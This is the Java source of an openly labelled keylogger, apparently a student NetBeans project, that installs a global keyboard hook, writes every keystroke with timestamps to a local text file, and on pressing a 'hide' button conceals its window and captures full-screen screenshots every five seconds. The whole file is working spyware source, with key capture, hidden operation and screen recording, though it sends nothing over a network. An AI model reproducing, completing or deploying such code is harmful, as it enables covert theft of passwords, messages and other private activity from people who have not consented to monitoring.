package keylogger;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import static java.lang.Thread.sleep;
import java.util.*;
import javax.imageio.ImageIO;
import javax.swing.JFrame;
import org.jnativehook.*;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.util.TimerTask;

/*
 * @author Andres
 */
public class vista extends JFrame implements NativeKeyListener{
    private String cadena =" ";
    private File f ; 
    private int cont = 0;
    private boolean activo;
    private Calendar cal = Calendar.getInstance(); 
    private String fecha = "";
    private String hora = "";
    private Capturar nueva; 
    public int i = 1 ;
    public vista() {
        initComponents();
        f = new File("Archivo.txt");
        activo = true;
        nueva = new Capturar();
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jButton3 = new javax.swing.JButton();
        jButton4 = new javax.swing.JButton();
        jButton6 = new javax.swing.JButton();
        jButton1 = new javax.swing.JButton();
        jScrollPane1 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("                                                                      KeyLogger");
        setMinimumSize(new java.awt.Dimension(530, 580));
        setPreferredSize(new java.awt.Dimension(530, 530));
        getContentPane().setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());

        jButton3.setText("ocultar");
        jButton3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton3ActionPerformed(evt);
            }
        });
        getContentPane().add(jButton3, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 470, 90, -1));

        jButton4.setText("Actualizar");
        getContentPane().add(jButton4, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 20, -1, -1));

        jButton6.setText("Salir");
        jButton6.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton6ActionPerformed(evt);
            }
        });
        getContentPane().add(jButton6, new org.netbeans.lib.awtextra.AbsoluteConstraints(400, 470, 80, -1));

        jButton1.setText("Informacion");
        getContentPane().add(jButton1, new org.netbeans.lib.awtextra.AbsoluteConstraints(380, 20, 90, -1));

        jTextArea1.setEditable(false);
        jTextArea1.setColumns(20);
        jTextArea1.setRows(5);
        jScrollPane1.setViewportView(jTextArea1);

        getContentPane().add(jScrollPane1, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 90, 440, 350));

        getAccessibleContext().setAccessibleName("KeyLogger");

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void jButton3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton3ActionPerformed
        activo = false;
        this.dispose();
        nueva.run();
        
    }//GEN-LAST:event_jButton3ActionPerformed

    private void jButton6ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton6ActionPerformed
        // TODO add your handling code here:
        System.exit(0);
    }//GEN-LAST:event_jButton6ActionPerformed

public static void main(String args[]) throws NativeHookException {
    
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(vista.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(vista.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(vista.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(vista.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        
         try {
		GlobalScreen.registerNativeHook();
		} catch(Exception ex) {
		ex.printStackTrace();
		}
		GlobalScreen.getInstance().addNativeKeyListener(new vista());

        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new vista().setVisible(true);
                
            }
        });
    }

    
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton3;
    private javax.swing.JButton jButton4;
    private javax.swing.JButton jButton6;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextArea jTextArea1;
    // End of variables declaration//GEN-END:variables


    public void nativeKeyPressed(NativeKeyEvent nke) {
      try{
          String fecha = cal.get(cal.DATE)+"/"+cal.get(cal.MONTH+1)+"/"+cal.get(cal.YEAR);
          String hora = cal.get(cal.HOUR_OF_DAY)+":"+cal.get(cal.MINUTE)+":"+cal.get(cal.SECOND); 
          
          FileWriter w = new FileWriter(f,true);
          BufferedWriter bw = new BufferedWriter(w);
          PrintWriter wr = new PrintWriter(bw); 
          
         cadena = NativeKeyEvent.getKeyText(nke.getKeyCode());
         
          if(cadena == "Espacio"){
              if(cont == 0){
              wr.write(" "+fecha+" "+hora+" ");
              cont++;
              }
              else{
              wr.write(" ");
              }
          }
          if(cadena == "Intro"){
             // wr.write(cadena);
              wr.write(" "+fecha+" "+hora+" ");
              wr.write(" \r\n  ");
          }
          if(cadena == "F12"){
              nueva.stop();
              if(activo == true){
              this.dispose();
              activo = false;
              }
              else{
              this.setVisible(true);
              activo = true;
              }
          }
          else{
              if(cont == 0){
              wr.write(""+fecha+" "+hora+" "+cadena);
              cont++;
              }
              else{
              wr.write(cadena);
              }
          }
          wr.close();
          bw.close();
         jTextArea1.append(cadena);
        }catch(IOException e){};
        System.out.printf(cadena);
    }

    public void nativeKeyReleased(NativeKeyEvent nke) {
    }
    
    public void nativeKeyTyped(NativeKeyEvent nke) {
      }
    
public class Captura{
public void captureScreen(String fileName) throws Exception{
Dimension screenSize = java.awt.Toolkit.getDefaultToolkit().getScreenSize();
Rectangle screenRectangle = new Rectangle(screenSize);
Robot robot = new Robot();
BufferedImage image = robot.createScreenCapture(screenRectangle);
ImageIO.write(image, "png", new File(fileName));
}
}

public class Capturar extends Thread{
    int i = 0;
    Captura cap = new Captura();
    
        @Override
    public void run(){
        while(true){
        try{
           
            System.out.println("[ Captura iniciada ]");
            //Thread.currentThread().sleep(5*1000);
            String nombre = "C:\\Users\\Andres\\Documents\\NetBeansProjects\\KeyLogger\\captura"+i+".png";
            cap.captureScreen(nombre);
            sleep(5000);
            i++;
            System.out.println("[ Captura finalizada ]");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    }
}
    
}
    
